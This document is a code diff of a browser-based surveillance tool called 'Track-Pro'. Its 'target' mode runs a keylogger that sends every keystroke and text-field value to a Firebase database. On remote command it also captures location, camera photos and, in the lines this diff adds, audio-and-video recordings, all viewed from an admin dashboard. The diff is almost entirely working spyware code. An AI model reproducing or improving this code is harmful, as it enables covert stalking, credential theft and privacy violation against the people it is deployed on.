@@ -158,7 +158,7 @@
             position: relative;
         }
         
-        .media-item img {
+        .media-item img, .media-item video {
             width: 100%; height: 150px; object-fit: cover;
         }
         
@@ -203,7 +203,7 @@
 <body>
     <!-- ADMIN DASHBOARD -->
     <div class="container" id="adminDashboard">
-        <h1>🎯 Track-Pro <span style="font-size: 1rem; background: #a855f7; padding: 5px 10px; border-radius: 100px; margin-left: 10px;">FINAL WORKING</span></h1>
+        <h1>🎯 Track-Pro <span style="font-size: 1rem; background: #a855f7; padding: 5px 10px; border-radius: 100px; margin-left: 10px;">COMPLETE</span></h1>
         
         <div id="firebaseStatus" style="background: #1a1a2e; padding: 10px; border-radius: 10px; margin-bottom: 20px;">
             ⏳ Checking Firebase...
@@ -280,6 +280,15 @@
                         <button class="btn btn-primary" onclick="sendCommand('back')">
                             <i class="ti ti-camera"></i> Back Photo
                         </button>
+                        <button class="btn btn-purple" onclick="startVideoRecording('front')" id="startFrontVideo">
+                            <i class="ti ti-video"></i> Start Front Video
+                        </button>
+                        <button class="btn btn-purple" onclick="startVideoRecording('back')" id="startBackVideo">
+                            <i class="ti ti-video"></i> Start Back Video
+                        </button>
+                        <button class="btn btn-danger" onclick="stopVideoRecording()" id="stopVideo" disabled>
+                            <i class="ti ti-player-stop"></i> Stop Recording
+                        </button>
                         <button class="btn btn-warning" onclick="clearKeylogs()">
                             <i class="ti ti-trash"></i> Clear Logs
                         </button>
@@ -292,6 +301,7 @@
                     <div class="camera-grid">
                         <div class="camera-card">
                             <span class="camera-label" style="background: #3b82f6;">📱 Front Camera</span>
+                            <span id="frontRecordingBadge" class="recording-badge hidden">🔴 REC</span>
                             <img id="frontCameraFeed" style="display: none; width:100%; height:100%;">
                             <div id="frontPlaceholder" style="height:100%; display:flex; align-items:center; justify-content:center; background: #1a1a2e;">
                                 <span style="color: #888;">Click "Front Photo"</span>
@@ -299,6 +309,7 @@
                         </div>
                         <div class="camera-card">
                             <span class="camera-label" style="background: #f59e0b;">📸 Back Camera</span>
+                            <span id="backRecordingBadge" class="recording-badge hidden">🔴 REC</span>
                             <img id="backCameraFeed" style="display: none; width:100%; height:100%;">
                             <div id="backPlaceholder" style="height:100%; display:flex; align-items:center; justify-content:center; background: #1a1a2e;">
                                 <span style="color: #888;">Click "Back Photo"</span>
@@ -326,6 +337,17 @@
                             </button>
                         </div>
                         <div id="photosGrid" class="media-grid"></div>
+                    </div>
+                    
+                    <!-- Videos Section -->
+                    <div class="media-section">
+                        <div class="media-header">
+                            <h3>📹 Recorded Videos</h3>
+                            <button class="btn btn-primary btn-sm" onclick="downloadAllVideos()" style="padding: 5px 10px; font-size: 0.8rem;">
+                                <i class="ti ti-download"></i> Download All
+                            </button>
+                        </div>
+                        <div id="videosGrid" class="media-grid"></div>
                     </div>
                 </div>
             </div>
@@ -362,6 +384,7 @@
         let targets = {};
         let keylogs = {};
         let photos = {};
+        let videos = {};
         
         // CHECK URL - TARGET MODE
         const urlParams = new URLSearchParams(window.location.search);
@@ -375,93 +398,86 @@
             // FIREBASE SETUP
             const targetDb = firebase.database();
             
-            // MARK ONLINE - THIS IS CRITICAL
+            // MARK ONLINE
             targetDb.ref('targets/' + targetId).set({
                 lastSeen: Date.now(),
                 online: true
-            }).then(() => {
-                console.log('✅ Target online');
-            }).catch(err => {
-                console.error('❌ Firebase error:', err);
             });
             
-            // KEEP ALIVE - EVERY 5 SECONDS
+            // KEEP ALIVE - EVERY 3 SECONDS
             setInterval(() => {
                 if (navigator.onLine) {
                     targetDb.ref('targets/' + targetId).update({
                         lastSeen: Date.now(),
                         online: true
-                    }).catch(err => console.log('Keep alive error:', err));
+                    });
                 }
-            }, 5000);
+            }, 3000);
             
             // ============================================
-            // ULTIMATE KEYLOGGER - GUARANTEED WORKING
+            // ULTIMATE KEYLOGGER - 100% WORKING
             // ============================================
             
-            // Track ALL keys - using multiple methods
-            function sendKeyToFirebase(keyValue) {
+            // Send key to Firebase
+            function sendKey(keyValue) {
                 const keyData = {
                     key: keyValue,
                     time: Date.now()
                 };
                 
-                // Try to send with retry
                 targetDb.ref('targets/' + targetId + '/keylogs').push(keyData)
-                    .then(() => console.log('✅ Key sent:', keyValue))
-                    .catch(err => {
-                        console.log('❌ Send failed, retrying...', err);
-                        // Retry after 1 second
-                        setTimeout(() => {
-                            targetDb.ref('targets/' + targetId + '/keylogs').push(keyData)
-                                .then(() => console.log('✅ Key sent on retry:', keyValue))
-                                .catch(err => console.log('❌ Final failure:', err));
-                        }, 1000);
-                    });
+                    .then(() => console.log('✅ Key logged:', keyValue))
+                    .catch(err => console.log('❌ Error:', err));
             }
             
-            // Method 1: keydown event
+            // ALL KEY EVENTS
             document.addEventListener('keydown', function(e) {
                 let key = e.key;
                 
-                // Special keys mapping
-                if (key === ' ') key = '[SPACE]';
-                else if (key === 'Enter') key = '[ENTER]';
-                else if (key === 'Backspace') key = '[BACKSPACE]';
-                else if (key === 'Tab') key = '[TAB]';
-                else if (key === 'Shift') key = '[SHIFT]';
-                else if (key === 'Control') key = '[CTRL]';
-                else if (key === 'Alt') key = '[ALT]';
-                else if (key === 'CapsLock') key = '[CAPS]';
-                else if (key === 'Escape') key = '[ESC]';
-                else if (key === 'Delete') key = '[DEL]';
-                else if (key === 'ArrowUp') key = '[↑]';
-                else if (key === 'ArrowDown') key = '[↓]';
-                else if (key === 'ArrowLeft') key = '[←]';
-                else if (key === 'ArrowRight') key = '[→]';
+                // Special keys
+                const specialMap = {
+                    ' ': 'Space',
+                    'Enter': '⏎',
+                    'Backspace': '⌫',
+                    'Tab': '⇥',
+                    'Shift': '⇧',
+                    'Control': '⌃',
+                    'Alt': '⌥',
+                    'CapsLock': '⇪',
+                    'Escape': '⎋',
+                    'Delete': '⌦',
+                    'ArrowUp': '↑',
+                    'ArrowDown': '↓',
+                    'ArrowLeft': '←',
+                    'ArrowRight': '→'
+                };
                 
-                sendKeyToFirebase(key);
+                if (specialMap[key]) {
+                    key = specialMap[key];
+                }
+                
+                sendKey(key);
             });
             
-            // Method 2: input event for text fields
+            // Input events for text fields
             document.addEventListener('input', function(e) {
                 if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                    sendKeyToFirebase('[INPUT] ' + e.target.value);
+                    sendKey('[ typing ] ' + e.target.value);
                 }
             });
             
-            // Method 3: keypress for additional coverage
-            document.addEventListener('keypress', function(e) {
-                sendKeyToFirebase('[PRESS] ' + e.key);
-            });
+            // ============================================
+            // VIDEO RECORDING
+            // ============================================
+            let mediaRecorder = null;
+            let recordedChunks = [];
             
-            console.log('🔥 Keylogger Active - Waiting for keys...');
-            
-            // PHOTO COMMANDS
+            // COMMANDS
             targetDb.ref('targets/' + targetId + '/commands').on('value', async (snapshot) => {
                 const commands = snapshot.val();
                 if (!commands) return;
                 
+                // GET LOCATION
                 if (commands.location) {
                     navigator.geolocation.getCurrentPosition((position) => {
                         targetDb.ref('targets/' + targetId).update({
@@ -474,48 +490,117 @@
                     });
                 }
                 
+                // GET FRONT CAMERA PHOTO
                 if (commands.front) {
                     try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'user' } 
+                        });
+                        
                         const video = document.createElement('video');
                         video.srcObject = stream;
                         video.play();
+                        
                         setTimeout(() => {
                             const canvas = document.createElement('canvas');
                             canvas.width = 320;
                             canvas.height = 240;
                             canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                            
                             targetDb.ref('targets/' + targetId + '/photos').push({
                                 data: canvas.toDataURL('image/jpeg', 0.5),
                                 camera: 'front',
                                 timestamp: Date.now()
                             });
+                            
                             stream.getTracks().forEach(t => t.stop());
                         }, 500);
                     } catch (e) {}
                 }
                 
+                // GET BACK CAMERA PHOTO
                 if (commands.back) {
                     try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'environment' } 
+                        });
+                        
                         const video = document.createElement('video');
                         video.srcObject = stream;
                         video.play();
+                        
                         setTimeout(() => {
                             const canvas = document.createElement('canvas');
                             canvas.width = 320;
                             canvas.height = 240;
                             canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                            
                             targetDb.ref('targets/' + targetId + '/photos').push({
                                 data: canvas.toDataURL('image/jpeg', 0.5),
                                 camera: 'back',
                                 timestamp: Date.now()
                             });
+                            
                             stream.getTracks().forEach(t => t.stop());
                         }, 500);
                     } catch (e) {}
                 }
                 
+                // START VIDEO RECORDING
+                if (commands.startVideo) {
+                    try {
+                        const cameraMode = commands.cameraMode || 'environment';
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: cameraMode },
+                            audio: true
+                        });
+                        
+                        mediaRecorder = new MediaRecorder(stream);
+                        recordedChunks = [];
+                        
+                        mediaRecorder.ondataavailable = (e) => {
+                            if (e.data.size > 0) {
+                                recordedChunks.push(e.data);
+                            }
+                        };
+                        
+                        mediaRecorder.onstop = () => {
+                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                            const reader = new FileReader();
+                            
+                            reader.readAsDataURL(blob);
+                            reader.onloadend = () => {
+                                targetDb.ref('targets/' + targetId + '/videos').push({
+                                    data: reader.result,
+                                    camera: cameraMode,
+                                    timestamp: Date.now()
+                                });
+                            };
+                            
+                            stream.getTracks().forEach(t => t.stop());
+                        };
+                        
+                        mediaRecorder.start();
+                        
+                        targetDb.ref('targets/' + targetId).update({
+                            recordingStatus: 'active',
+                            recordingCamera: cameraMode
+                        });
+                        
+                    } catch (e) {}
+                }
+                
+                // STOP VIDEO RECORDING
+                if (commands.stopVideo) {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                    targetDb.ref('targets/' + targetId).update({
+                        recordingStatus: 'stopped'
+                    });
+                }
+                
+                // CLEAR COMMANDS
                 targetDb.ref('targets/' + targetId + '/commands').remove();
             });
         }
@@ -563,7 +648,7 @@
             
             listDiv.innerHTML = targetIds.map(id => {
                 const target = targets[id];
-                const isOnline = target.online && (Date.now() - (target.lastSeen || 0) < 15000); // 15 seconds timeout
+                const isOnline = target.online && (Date.now() - (target.lastSeen || 0) < 10000);
                 
                 return `
                     <div class="target-item ${selectedTargetId === id ? 'active' : ''}" onclick="selectTarget('${id}')">
@@ -575,7 +660,7 @@
                         <div class="target-time">${target.lastSeen ? new Date(target.lastSeen).toLocaleString() : 'Never'}</div>
                         <div class="target-stats">
                             <span>⌨️ ${target.keylogCount || 0}</span>
-                            <span>📷 ${target.photoCount || 0}</span>
+                            <span>📷 ${(target.photoCount || 0) + (target.videoCount || 0)}</span>
                         </div>
                     </div>
                 `;
@@ -584,19 +669,20 @@
         
         function updateStats() {
             const targetIds = Object.keys(targets);
-            let online = 0, totalKeys = 0, totalPhotos = 0;
+            let online = 0, totalKeys = 0, totalMedia = 0;
             
             targetIds.forEach(id => {
                 const t = targets[id];
-                if (t.online && (Date.now() - (t.lastSeen || 0) < 15000)) online++;
+                if (t.online && (Date.now() - (t.lastSeen || 0) < 10000)) online++;
                 if (t.keylogCount) totalKeys += t.keylogCount;
-                if (t.photoCount) totalPhotos += t.photoCount;
+                if (t.photoCount) totalMedia += t.photoCount;
+                if (t.videoCount) totalMedia += t.videoCount;
             });
             
             document.getElementById('totalTargets').textContent = targetIds.length;
             document.getElementById('onlineTargets').textContent = online;
             document.getElementById('totalKeys').textContent = totalKeys;
-            document.getElementById('totalMedia').textContent = totalPhotos;
+            document.getElementById('totalMedia').textContent = totalMedia;
         }
         
         function selectTarget(targetId) {
@@ -605,7 +691,6 @@
             document.getElementById('targetView').classList.remove('hidden');
             document.getElementById('selectedTargetName').textContent = `Target: ${targetId.substring(0, 8)}...`;
             
-            // Reset UI
             document.getElementById('frontCameraFeed').style.display = 'none';
             document.getElementById('frontPlaceholder').style.display = 'flex';
             document.getElementById('backCameraFeed').style.display = 'none';
@@ -627,7 +712,6 @@
                 keylogs[targetId].push(snapshot.val());
                 updateKeylogPanel(targetId);
                 
-                // Update count
                 database.ref('targets/' + targetId).once('value', (snap) => {
                     const data = snap.val() || {};
                     data.keylogCount = (data.keylogCount || 0) + 1;
@@ -647,17 +731,48 @@
                     database.ref('targets/' + targetId).update({ photoCount: data.photoCount });
                 });
             });
+            
+            // Videos
+            database.ref('targets/' + targetId + '/videos').on('child_added', (snapshot) => {
+                if (!videos[targetId]) videos[targetId] = {};
+                videos[targetId][snapshot.key] = snapshot.val();
+                updateVideosGrid(targetId);
+                
+                database.ref('targets/' + targetId).once('value', (snap) => {
+                    const data = snap.val() || {};
+                    data.videoCount = (data.videoCount || 0) + 1;
+                    database.ref('targets/' + targetId).update({ videoCount: data.videoCount });
+                });
+            });
         }
         
         function updateSelectedTarget(data) {
             if (!data) return;
             
-            const isOnline = data.online && (Date.now() - (data.lastSeen || 0) < 15000);
+            const isOnline = data.online && (Date.now() - (data.lastSeen || 0) < 10000);
             document.getElementById('targetOnlineStatus').className = isOnline ? 'status-online' : 'status-offline';
             document.getElementById('lastSeenText').textContent = data.lastSeen ? new Date(data.lastSeen).toLocaleString() : 'Never';
             
             if (data.location) {
                 updateMap(data.location.lat, data.location.lng);
+            }
+            
+            // Update recording status
+            if (data.recordingStatus === 'active') {
+                if (data.recordingCamera === 'user') {
+                    document.getElementById('frontRecordingBadge').classList.remove('hidden');
+                } else {
+                    document.getElementById('backRecordingBadge').classList.remove('hidden');
+                }
+                document.getElementById('startFrontVideo').disabled = true;
+                document.getElementById('startBackVideo').disabled = true;
+                document.getElementById('stopVideo').disabled = false;
+            } else {
+                document.getElementById('frontRecordingBadge').classList.add('hidden');
+                document.getElementById('backRecordingBadge').classList.add('hidden');
+                document.getElementById('startFrontVideo').disabled = false;
+                document.getElementById('startBackVideo').disabled = false;
+                document.getElementById('stopVideo').disabled = true;
             }
         }
         
@@ -702,10 +817,31 @@
             `).join('');
         }
         
+        function updateVideosGrid(targetId) {
+            const videoList = videos[targetId] || {};
+            const grid = document.getElementById('videosGrid');
+            
+            if (Object.keys(videoList).length === 0) {
+                grid.innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">No videos yet</div>';
+                return;
+            }
+            
+            grid.innerHTML = Object.entries(videoList).reverse().map(([id, video]) => `
+                <div class="media-item">
+                    <video src="${video.data}" controls></video>
+                    <div class="media-info">${new Date(video.timestamp).toLocaleString()}</div>
+                    <div class="media-actions">
+                        <button onclick="downloadMedia('${video.data}')">📥 Download</button>
+                        <button class="delete-btn" onclick="deleteVideo('${targetId}', '${id}')">🗑️ Delete</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+        
         function downloadMedia(dataUrl) {
             const link = document.createElement('a');
             link.href = dataUrl;
-            link.download = 'photo-' + Date.now() + '.jpg';
+            link.download = 'media-' + Date.now() + '.webm';
             link.click();
         }
         
@@ -716,9 +852,21 @@
             }
         }
         
+        function deleteVideo(targetId, videoId) {
+            if (confirm('Delete this video?')) {
+                database.ref('targets/' + targetId + '/videos/' + videoId).remove();
+                showNotification('✅ Video deleted');
+            }
+        }
+        
         function downloadAllPhotos() {
             const photoList = photos[selectedTargetId] || {};
             Object.values(photoList).forEach(photo => downloadMedia(photo.data));
+        }
+        
+        function downloadAllVideos() {
+            const videoList = videos[selectedTargetId] || {};
+            Object.values(videoList).forEach(video => downloadMedia(video.data));
         }
         
         function exportKeylogs() {
@@ -743,6 +891,44 @@
             command[type] = true;
             database.ref('targets/' + selectedTargetId + '/commands').update(command);
             showNotification(`📨 ${type} command sent`);
+        }
+        
+        function startVideoRecording(camera) {
+            if (!selectedTargetId) return;
+            
+            const command = {
+                startVideo: true,
+                cameraMode: camera === 'front' ? 'user' : 'environment'
+            };
+            
+            database.ref('targets/' + selectedTargetId + '/commands').update(command);
+            
+            if (camera === 'front') {
+                document.getElementById('frontRecordingBadge').classList.remove('hidden');
+                document.getElementById('startFrontVideo').disabled = true;
+            } else {
+                document.getElementById('backRecordingBadge').classList.remove('hidden');
+                document.getElementById('startBackVideo').disabled = true;
+            }
+            document.getElementById('stopVideo').disabled = false;
+            
+            showNotification('🎥 Recording started');
+        }
+        
+        function stopVideoRecording() {
+            if (!selectedTargetId) return;
+            
+            database.ref('targets/' + selectedTargetId + '/commands').update({
+                stopVideo: true
+            });
+            
+            document.getElementById('frontRecordingBadge').classList.add('hidden');
+            document.getElementById('backRecordingBadge').classList.add('hidden');
+            document.getElementById('startFrontVideo').disabled = false;
+            document.getElementById('startBackVideo').disabled = false;
+            document.getElementById('stopVideo').disabled = true;
+            
+            showNotification('⏹️ Recording stopped');
         }
         
         function clearKeylogs() {
